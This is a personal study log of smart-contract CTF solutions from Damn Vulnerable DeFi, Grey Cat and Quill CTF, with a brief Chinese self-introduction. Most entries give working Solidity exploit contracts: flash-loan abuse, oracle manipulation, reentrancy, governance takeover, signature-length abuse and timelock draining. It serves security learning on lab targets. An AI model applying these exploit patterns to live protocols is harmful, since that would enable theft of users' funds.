---
timezone: America/New_York
---


# spark

1. 自我介绍：web3安全攻城狮
2. 你认为你会完成本次残酷学习吗？会

## Notes

<!-- Content_START -->

### 2024.08.29
- Damn Vulnerable DeFi: Unstoppable
- Grey Cat the Flag 2024 Milotruck challs: GreyHats Dollar

#### Unstoppable
Issue:

The main issue lies inside the `flashLoan`:
- For `totalAssets` it will calculate the total token in the contract:
    ```solidity
            return asset.balanceOf(address(this));
    ```
- For `convertToShares` it will do following calculation, which will calculate the total amount for share token
    ```solidity
        supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
    ```

If `convertToShares(totalSupply) != totalAssets()` revert then the problem will be solved. But how?

Simply, deposit some token directly, so the condition will be broken since supply only update while mint/burn.

Solve:
```solidity
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 10);
    }
```



#### GreyHats Dollar
Issue:

The issue algin with the challenge is that, the share update in `transferFrom` function always using legacy share amount when `from` and `to` address are same.
```solidity
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public update returns (bool) {
        // ...

        uint256 _shares = _GHDToShares(amount, conversionRate, false);
        uint256 fromShares = shares[from] - _shares;
        uint256 toShares = shares[to] + _shares;
        
        // ...

        shares[from] = fromShares;
        shares[to] = toShares;

        emit Transfer(from, to, amount);

        return true;
    }
```

Solve:
```solidity
    function solve() external {
        // Claim 1000 GREY
        setup.claim();

        // Mint 1000 GHD using 1000 GREY
        setup.grey().approve(address(setup.ghd()), 1000e18);
        setup.ghd().mint(1000e18);

        setup.ghd().balanceOf(address(this));

        uint256 balance = setup.ghd().balanceOf(address(this));

        setup.ghd().transfer(address(this), balance); //@note gonna double the balance

        
        for (uint i = 0; i <52; i++) {
            setup.ghd().transfer(address(this), balance);
        }

        setup.ghd().transfer(msg.sender, setup.ghd().balanceOf(address(this)));

    }
```

### 2024.08.30

- Damn Vulnerable DeFi: Truster
- Damn Vulnerable DeFi: SideEntrance

#### Truster
Issue:

The issue for this flashloan contract is the usage of `functionCall` which allows the attacker perform function call under flashloan contract's context.

Solve:
```solidity
    function test_truster() public checkSolvedByPlayer {
        test t = new test();

        bytes memory approveData = abi.encodeWithSignature(
            "approve(address,uint256)",
            player,
            type(uint256).max
        );
        
        pool.flashLoan(0, player, address(pool.token()), approveData);

        pool.token().transferFrom(address(pool), recovery, TOKENS_IN_POOL);

    }
```

#### SideEntrance
Issue: 

The main idea for this program is utilize the the deposit function while flashloan which will manipulate the balance and also fulfill the balance requirement to complete the flashloan.

Solve:

```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    Exploit exp = new Exploit(address(pool), recovery);
    exp.attack(address(pool).balance);
}

contract Exploit{
    SideEntranceLenderPool pool;

    address recovery;
    constructor(address _pool, address _recovery) {
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
    }
    function execute()public payable{
        pool.deposit{value:address(this).balance}();
    }
    function attack(uint256 amount) public payable{
        pool.flashLoan(amount);
        pool.withdraw();
        payable(recovery).transfer(address(this).balance);
    }
    receive () external payable {}

}
```

### 2024.08.31

- Damn Vulnerable DeFi: Selfie

#### Selfie
Issue:

I feel the biggest issue is that the pool is providing the governance token via flashloan, as long as the token exceed half of the supply, the proposal can be passed.

```solidity
    function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _votingToken.getVotes(who);
        uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
        return balance > halfTotalSupply;
    }
```

Solve:
```solidity
    function test_selfie() public checkSolvedByPlayer {
        SelfiePoolExploit spe = new SelfiePoolExploit(
            pool,
            governance,
            token,
            recovery
        );

        spe.attack();

        vm.warp(block.timestamp + 2 days);
        spe.executeAction();

    }

```

```solidity
contract SelfiePoolExploit {
    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableVotes votes;
    uint256 public actionId;
    address owner;
    address recovery;

    constructor(SelfiePool _pool, SimpleGovernance _governance, DamnValuableVotes _vote, address _recovery) {
        pool = _pool;
        governance = _governance;
        votes = _vote;
        owner = msg.sender;
        recovery = _recovery;
    }

    function attack() external {
        // init flashloan
        uint256 amount = pool.token().balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(pool.token()), amount, data);
    }

    function onFlashLoan(
        address _initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){

        votes.delegate(address(this));

        uint _actionId = governance.queueAction(
            address(pool),
            0,
            data
        );
        actionId = _actionId;

        IERC20(token).approve(address(pool), amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAction() external {
        // Execute the malicious auction
        governance.executeAction(actionId);
    }
}
```


### 2024.09.01

- Damn Vulnerable DeFi: Backdoor

#### Backdoor

Solve:

```solidity
    function test_backdoor() public checkSolvedByPlayer {
        BackdoorAttacker ba = new BackdoorAttacker(recovery, token);
        ba.attack(
            address(walletFactory),
            address(singletonCopy), 
            address(walletRegistry), 
            users
        );

    }
```

```solidity
interface ISafe {
    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external;
}
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

contract Approve {
  function approve(DamnValuableToken token, address spender) external {
      token.approve(spender, type(uint256).max);
    }
}

contract BackdoorAttacker {
  address recovery;
  DamnValuableToken token;
  Approve mApprove;

  constructor(address _recovery, DamnValuableToken _token) {
    recovery = _recovery;
    token = _token;
  }

  function attack(address _walletFactory, address _singletonCopy, address _walletRegistry, address[] calldata _users) external {
    mApprove = new Approve();
    for (uint256 i = 0; i < 4; i++) {
            address[] memory users = new address[](1);
            users[0] = _users[i];
            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                users,
                1,
                mApprove,
                abi.encodeWithSelector(Approve.approve.selector, token, address(this)),
                address(0x0),
                address(0x0),
                0,
                address(0x0)
            );

            SafeProxy proxy = SafeProxyFactory(_walletFactory).createProxyWithCallback(
                _singletonCopy,
                initializer,
                i,
                IProxyCreationCallback(_walletRegistry)
            );

            token.transferFrom(address(proxy), recovery, token.balanceOf(address(proxy)));
        }
    }  
}
```

### 2024.09.03

- Damn Vulnerable DeFi: Puppet
- Damn Vulnerable DeFi: PuppetV2

#### Puppet

Issue: The main issue is using the price from pair which can be manipulated.

Solve:
```
contract PuppetExploit {

    PuppetPool lendingPool;
    address recovery;
    DamnValuableToken token;
    IUniswapV1Exchange uniswapV1Exchange; 
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;

    constructor(PuppetPool _lendingPool, address _recovery, DamnValuableToken _token, IUniswapV1Exchange _uniswapV1Exchange) {
        lendingPool = _lendingPool;
        recovery = _recovery;
        token = _token;
        uniswapV1Exchange = _uniswapV1Exchange;
    }

    function attack() public {
        
        uint256 total = token.balanceOf(address(lendingPool));
        lendingPool.calculateDepositRequired(total);

        token.approve(address(uniswapV1Exchange), type(uint256).max);

        uniswapV1Exchange.tokenToEthSwapInput(
            PLAYER_INITIAL_TOKEN_BALANCE,
            1,
            block.timestamp + 1
        );

        uint256 need = lendingPool.calculateDepositRequired(total);

        assert(need < address(this).balance);

        lendingPool.borrow{value: need}(
            POOL_INITIAL_TOKEN_BALANCE,
            recovery
        );
        
    }

    receive() external payable {}

    
}
```

#### PuppetV2

Issue: Similar to the previous one

Solve:
```solidity
contract PuppetV2Exploit {

    PuppetV2Pool lendingPool;
    address recovery;
    DamnValuableToken token;
    IUniswapV2Pair uniswapV2Exchange; 
    WETH weth;
    IUniswapV2Router02 uniswapV2Router;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;

    constructor(PuppetV2Pool _lendingPool, address _recovery, DamnValuableToken _token, IUniswapV2Pair _uniswapV2Exchange, WETH _weth, IUniswapV2Router02 _uniswapV2Router) {
        lendingPool = _lendingPool;
        recovery = _recovery;
        token = _token;
        uniswapV2Exchange = _uniswapV2Exchange;
        weth = _weth;
        uniswapV2Router = _uniswapV2Router;
    }

    function attack() public {
                
        token.approve(address(uniswapV2Router), type(uint256).max);
        weth.deposit{value: address(this).balance}();

        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
//3e23
        uint256[] memory out = uniswapV2Router.swapExactTokensForTokens(
            PLAYER_INITIAL_TOKEN_BALANCE,
            1, 
            path, 
            address(this), 
            block.timestamp + 100
        );


        uint256 need = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        weth.approve(address(lendingPool), type(uint256).max);


        assert(need < weth.balanceOf(address(this)));

        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
        
    }

    receive() external payable {}

    
}
```
### 2024.09.04

- Damn Vulnerable DeFi: PuppetV3

#### PuppetV3
```solidity
    function test_puppetV3() public checkSolvedByPlayer {
        ISwapRouter router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
        token.approve(address(router), type(uint256).max);
        router.exactInputSingle(
            ISwapRouter.ExactInputSingleParams(
                address(token),
                address(weth),
                FEE,
                address(player),
                block.timestamp + 1,
                PLAYER_INITIAL_TOKEN_BALANCE, 
                0,
                0
            )
        );

        while(true){
            vm.warp(block.timestamp + 10);
            uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
            if(quote <= weth.balanceOf(player)) break;
        }

        console.log("Time: ", block.timestamp);
        weth.approve(address(lendingPool), type(uint256).max);
        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);   

    }
```

### 2024.09.05

- Damn Vulnerable DeFi: Climber

#### Climber

Issue:

The main issue should related to the CHECK-EFFECT-PATTERN broken, which allows anyone run function call first then check the operation validity:
```solidity
        bytes32 id = getOperationId(targets, values, dataElements, salt);

        for (uint8 i = 0; i < targets.length; ++i) {
            targets[i].functionCallWithValue(dataElements[i], values[i]);
        }

        if (getOperationState(id) != OperationState.ReadyForExecution) {
            revert NotReadyForExecution(id);
        }
```

Solve: 

```solidity
contract ClimberExploit{

    address payable timeLock;
    address token;
    address vault;
    address player;
    address recovery;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    function exploit(address payable _timeLock, address _token, address _vault, address _player, address _recovery) public {

        MyImplementation mi = new MyImplementation();

        timeLock = _timeLock;
        token = _token;
        vault = _vault;
        player = _player;
        recovery = _recovery;

        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);

        targets[0] = timeLock;
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        targets[1] = timeLock;
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));

        targets[2] = vault;
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(mi), "");

        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("schedule()");

        ClimberTimelock(timeLock).execute(targets, values, dataElements, bytes32(0));

        MyImplementation(address(vault)).drain(address(token), recovery);

    }


    function schedule() public{
        ClimberTimelock(timeLock).schedule(targets, values, dataElements, bytes32(0));
    }
}

contract MyImplementation is ClimberVault{

    function drain(address token, address receipent) public{
        DamnValuableToken(token).transfer(receipent, DamnValuableToken(token).balanceOf(address(this)));
    }

}
```

### 2024.09.06

- Damn Vulnerable DeFi: FreeRider

#### FreeRider

Issue:

There are 2 main issues:
1. fee check is inside _buyOne with msg.value
   ```solidity
       if (msg.value < priceToPay) {
            revert InsufficientPayment();
        }
   ```
2. seller payment sending to new owner
   ```solidity
       _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);
    
       // pay seller using cached token
       payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
   ```

Solve:
```solidity
contract FreeRiderExploit{
    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;
    address player;

    uint256 constant NFT_PRICE = 15 ether;

    constructor(
        WETH _weth,
        DamnValuableToken _token,
        IUniswapV2Factory _uniswapV2Factory,
        IUniswapV2Router02 _uniswapV2Router,
        IUniswapV2Pair _uniswapPair,
        FreeRiderNFTMarketplace _marketplace,
        DamnValuableNFT _nft,
        FreeRiderRecoveryManager _recoveryManager
    ){
        weth = _weth;
        token = _token;
        uniswapV2Factory = _uniswapV2Factory;
        uniswapV2Router = _uniswapV2Router;
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        nft = _nft;
        recoveryManager = _recoveryManager;
        player = msg.sender;
    }

    function exploit() public{
        uniswapPair.swap(NFT_PRICE, 0, address(this), "123");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public{
        
        weth.withdraw(NFT_PRICE);

        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        marketplace.buyMany{value: NFT_PRICE}(tokenIds);

        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(player));
        }

        console.log("*** balance: ", address(this).balance);

        uint256 repay = NFT_PRICE * 1004 / 1000;
        weth.deposit{value: repay}();
        weth.transfer(address(uniswapPair), repay);

    }
    
    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
```

### 2024.09.07

- Damn Vulnerable DeFi: The Rewarder

#### The Rewarder

Issue:

I think the biggest issue is that the claimed mark only updated while the last claim, which allows duplicate claim:
```solidity
            // for the last claim
            if (i == inputClaims.length - 1) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }
```

Solve:

```solidity
    function test_theRewarder() public checkSolvedByPlayer {
        console.log("****", player);
        uint256 playerDVT = 11524763827831882;
        uint256 playerWETH = 1171088749244340;

        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );

        bytes32[] memory wethLeaves = _loadRewards(
            "/test/the-rewarder/weth-distribution.json"
        );

        IERC20[] memory inputTokens = new IERC20[](2);
        inputTokens[0] = IERC20(address(dvt));
        inputTokens[1] = IERC20(address(weth));

        uint256 expectedDVTLeft = TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT;
        uint256 expectedWETHLeft = TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT;

        console.log(expectedDVTLeft, expectedWETHLeft);

        uint256 dvtTxCount = expectedDVTLeft/playerDVT;
        uint256 wethTxCount = expectedWETHLeft/playerWETH;
        uint256 txTotal = dvtTxCount + wethTxCount;

        Claim[] memory inputClaims = new Claim[](txTotal);


        for(uint i = 0; i < dvtTxCount; i++){
            inputClaims[i] = Claim({
                batchNumber: 0, 
                amount: playerDVT,
                tokenIndex: 0, // dvt
                proof: merkle.getProof(dvtLeaves, 188) 
            });
        }

        for(uint i = dvtTxCount; i < txTotal; i++){
            inputClaims[i] = Claim({
                batchNumber: 0, 
                amount: playerWETH,
                tokenIndex: 1, // weth
                proof: merkle.getProof(wethLeaves, 188) 
            });
        }

        distributor.claimRewards(
            inputClaims, 
            inputTokens
        );

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }
```

### 2024.09.09

- Quill CTF: Road Closed
- Quill CTF: VIP Bank

#### Road Closed
There is no access control with `addToWhitelist`, so we can call `addToWhitelist` -> `changeOwner` -> `pwn` with a EOA? However, this quiz might want to check the code size while the constructor phase is 0.


#### VIP Bank
The goal is to block the withdraw, which we can take advantage from the `selfdestruct`:
```solidity
require(address(this).balance <= maxETH, "Cannot withdraw more than 0.5 ETH per transaction");
        require(balances[msg.sender] >= _amount, "Not enough ether");
```

#### Solve:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {RoadClosed} from "../src/road-block.sol";
import {VIP_Bank} from "../src/VIPBank.sol";

contract CounterTest is Test {
    RoadClosed public roadClosed;
    VIP_Bank public vipBank;


    function setUp() public {
        roadClosed = new RoadClosed();
        vipBank = new VIP_Bank();
    }

    function test_solve_road() public {
        RoadClosedExploit rce = new RoadClosedExploit(roadClosed);
        assert(roadClosed.isHacked());
    }

    function test_solve_vip() public {
        vipBank.addVIP(address(this));
        vipBank.deposit{value: 0.05 ether}();

        VIPBankExploit ve = new VIPBankExploit{value: 0.01 ether}(address(vipBank));

        vm.expectRevert();
        vipBank.withdraw(0.01 ether);
    }

}

contract RoadClosedExploit{
    constructor( RoadClosed rc) {
        rc.addToWhitelist(address(this));
        rc.changeOwner(address(this));
        rc.pwn(address(this));
    }
}

contract VIPBankExploit{
    constructor(address bank) payable{
        selfdestruct(payable(bank));
    }
}
```

### 2024.09.10

- Quill CTF: Confidential Hash
- Quill CTF: Safe NFT

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Confidential} from "../src/confidentialHash.sol";
import {safeNFT} from "../src/safeNFT.sol";
import '@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol';

contract CounterTest2 is Test {
    Confidential public confidential;
    safeNFT public nft;


    function setUp() public {
        confidential = new Confidential();
        nft = new safeNFT("safe", "safe", 0.01 ether);
    }

    function test_solve_confidential() public {
        bytes32 alice = vm.load(address(confidential), bytes32(uint256(4)));
        bytes32 bob = vm.load(address(confidential), bytes32(uint256(9)));    
        bytes32 mhash = keccak256(abi.encodePacked(alice, bob));
        confidential.checkthehash(mhash);
    }

    function test_solve_nft() public {
        SafeNFTExploit sne = new SafeNFTExploit(nft);
        sne.exploit{value: 0.01 ether}();
        assert( nft.balanceOf(address(sne)) > 1);
    }

}

contract SafeNFTExploit is IERC721Receiver{

  safeNFT private nft;
  uint256 breaker;

  constructor(safeNFT _nft ) {
    nft = _nft;
  }

  function exploit() external payable {
    nft.buyNFT{value: msg.value}();
    nft.claim();
  }


  function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes calldata 
  ) external override returns (bytes4) {

    if(breaker == 0){
        breaker += 1;
        nft.claim();
    }
    
    return IERC721Receiver.onERC721Received.selector;
  }
}
```


### 2024.09.11

- Quill CTF: D31eg4t3

![image](https://github.com/user-attachments/assets/cfa5ab91-11cf-437b-8f22-731ceb597e43)

```solidity
contract D31eg4t3Exploit {
  uint a = 12345;
  uint8 b = 32;
  string private d; 
  uint32 private c; 
  string private mot; 
  address public owner;
  mapping(address => bool) public canYouHackMe; 

  constructor(){
    owner = msg.sender;
  }

  function attack(D31eg4t3 delegate) external {
    (bool success, ) = delegate.hackMe("");
    require(success, "hack me fail");
  }

  fallback() external {
    owner = owner;
    yesICan[owner] = true;
  }
}
```

### 2024.09.12

- Quill CTF: Collatz Puzzle
https://github.com/devtooligan/collatzPuzzle/blob/main/test/CollatzPuzzle.sol

```huff
#define macro MAIN() = takes (0) returns (0) {
  0x04 calldataload    // Load the input value 'n' from calldata at offset 0x04
  0x02                 // Push the constant 2 onto the stack
  dup2                 // Duplicate 'n' on the stack
  mod                  // Calculate n % 2 to check if 'n' is even or odd
  iszero               // Check if (n % 2) == 0
  handleEvenCase jumpi // If 'n' is even, jump to the 'handleEvenCase' label
  0x03                 // Push the constant 3 onto the stack
  mul                  // Calculate 3 * n
  0x1                  // Push the constant 1 onto the stack
  add                  // Calculate (3 * n) + 1
  returnResult jump    // Jump to the 'returnResult' label to return the result
  
  handleEvenCase:
  0x01                 // Push the constant 1 onto the stack 
  shr                  // Calculate n >> 1 (equivalent to n / 2)
 
 returnResult:
  returndatasize mstore // Store the result in memory
  calldatasize returndatasize return // Return the result
    
}
```

### 2024.09.13

- Quill CTF: Weth10
- Quill CTF: weth11

```solidity
contract WETH10Exploit{

    function exploit(address payable weth10) public payable {
        WETH10(weth10).execute(weth10, 0, abi.encodeWithSelector(ERC20.approve.selector, address(this), type(uint256).max));

        for (uint i; i < 20; ++i) {
            WETH10(weth10).deposit{value: 0.5 ether}();
            WETH10(weth10).withdrawAll();
        }

        WETH10(weth10).transferFrom(weth10, address(this), WETH10(weth10).balanceOf(weth10));
        WETH10(weth10).withdrawAll();

        payable(msg.sender).transfer(address(this).balance);

    }

    receive() external payable {
        WETH10(payable(msg.sender)).transfer(msg.sender, WETH10(payable(msg.sender)).balanceOf(address(this)));
    }

}
```

```solidity
        weth.execute(address(weth), 0, abi.encodeWithSelector(ERC20.approve.selector, address(bob), type(uint256).max));
        weth.transferFrom(address(weth), address(bob), weth.balanceOf(address(weth)));
        weth.withdrawAll();
```

### 2024.09.15

- Quill CTF: TrueXOR
- Quill CTF: VoteToken

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/TrueXOR.sol";


contract TrueXORTest is Test {
    TrueXOR public txor;
    address bob;

    function setUp() public {
        txor = new TrueXOR();
        bob = address(1);
    }

    function testHack() public {
        TrueXORExploit te = new TrueXORExploit();
        vm.startPrank(bob, bob);
        txor.ctf(address(te));
        vm.stopPrank();
    }
}

contract TrueXORExploit is IBoolGiver {

  function giveBool() external view override returns (bool) {
    uint256 g = gasleft();
    if(g%2 == 1)
        return true;
    else
        return false;
  }

}
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.12;

import "forge-std/Test.sol";
import "../src/VoteToken.sol";

contract VoteTokenTest is Test {
	VoteToken vToken;
	address public owner = address(0);
	address public hacker =address(1337);

	address public alice= address(1);
	address public bob = address(2);
	address public carl = address(3);

	function setUp() public {
		vm.startPrank(owner);
		vToken = new VoteToken();
		vToken.mint(alice, 1000);
		vm.stopPrank();
  }
	
	function testExploit() public {
    vm.startPrank(alice);
    vToken.delegate(hacker);
    vToken.transfer(bob, 1000);
    vm.stopPrank();
    vm.startPrank(bob);
    vToken.delegate(hacker);
    vToken.transfer(carl, 1000);
    vm.stopPrank();
    vm.startPrank(carl);
    vToken.delegate(hacker);
    vToken.transfer(hacker, 1000);            
    vm.stopPrank();

		uint hacker_vote = vToken.getVotes(hacker);
    console.log("Vote Count of Hacker before attack: %s ", hacker_vote);

		uint hacker_balance= vToken.balanceOf(hacker);
    console.log("Hacker's vToken after the attack: %s: ", hacker_balance);

		assertEq(hacker_vote , 3000);
		assertEq(hacker_balance, 1000);
	}
}
```

### 2024.09.16

- Quill CTF: PandaToken

#### PandaToken
check layout:
```
➜  test-quill git:(main) ✗ forge inspect ./src/pandaToken.sol:PandaToken storage-layout --pretty
| Name           | Type                                            | Slot | Offset | Bytes | Contract                      |
|----------------|-------------------------------------------------|------|--------|-------|-------------------------------|
| _balances      | mapping(address => uint256)                     | 0    | 0      | 32    | src/pandaToken.sol:PandaToken |
| _allowances    | mapping(address => mapping(address => uint256)) | 1    | 0      | 32    | src/pandaToken.sol:PandaToken |
| _totalSupply   | uint256                                         | 2    | 0      | 32    | src/pandaToken.sol:PandaToken |
| _name          | string                                          | 3    | 0      | 32    | src/pandaToken.sol:PandaToken |
| _symbol        | string                                          | 4    | 0      | 32    | src/pandaToken.sol:PandaToken |
| _owner         | address                                         | 5    | 0      | 20    | src/pandaToken.sol:PandaToken |
| c1             | uint256                                         | 6    | 0      | 32    | src/pandaToken.sol:PandaToken |*
| usedSignatures | mapping(bytes => bool)                          | 7    | 0      | 32    | src/pandaToken.sol:PandaToken |
| burnPending    | mapping(address => uint256)                     | 8    | 0      | 32    | src/pandaToken.sol:PandaToken |
```

calculateAmount = (input * 1000) / (599 + 1 + c1) => c1 = 400 => calculateAmount = input

The contract is little misleading since the root cause is the signature **don't** have a length check, and when decoding from bytes, it will only take care about the first 65.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/pandaToken.sol";

contract PandaTokenHack is Test {
    PandaToken pandatoken;
    address owner = vm.addr(1);
    address hacker = vm.addr(2);

    function setUp() external {
        vm.prank(owner);
        pandatoken = new PandaToken(400, "PandaToken", "PND");
    }

    function test() public {
        vm.startPrank(hacker);
        bytes32 hash = keccak256(abi.encode(hacker, 1 ether));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);

        // your goal - to have 3 tokens (3e18) on your own(hacker) balance.
        // solution
        pandatoken.balanceOf(owner);
        pandatoken.balanceOf(hacker);

        pandatoken.getTokens(1 ether, abi.encodePacked(r,s,v));
        pandatoken.getTokens(1 ether, abi.encodePacked(r,s,v, bytes32(hex"1111")));
        pandatoken.getTokens(1 ether, abi.encodePacked(r,s,v, bytes32(hex"2222")));
       

        assertEq(pandatoken.balanceOf(hacker), 3 ether);
    }
}
```


<!-- Content_END -->
